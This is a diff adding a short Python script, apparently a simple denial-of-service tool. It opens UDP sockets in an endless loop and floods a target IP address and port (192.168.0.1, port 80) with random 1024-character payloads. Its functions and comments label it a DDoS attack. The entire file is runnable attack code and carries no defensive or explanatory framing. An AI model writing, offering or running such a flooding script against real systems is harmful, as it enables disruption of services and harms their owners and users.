@@ -1,0 +1,28 @@
+import socket
+import random
+
+target_ip = "192.168.0.1"  # IP address of the target
+target_port = 80  # Port number to attack (e.g., 80 for HTTP)
+
+# Generate a random string of characters to send as payload
+def generate_payload(length):
+    letters = "abcdefghijklmnopqrstuvwxyz"
+    return ''.join(random.choice(letters) for _ in range(length))
+
+# Send a flood of packets to the target
+def ddos_attack():
+    while True:
+        # Create a socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        
+        # Generate a random payload
+        payload = generate_payload(1024)
+        
+        # Send the payload to the target IP and port
+        sock.sendto(payload.encode(), (target_ip, target_port))
+        
+        # Close the socket
+        sock.close()
+
+# Execute the DDoS attack
+ddos_attack()
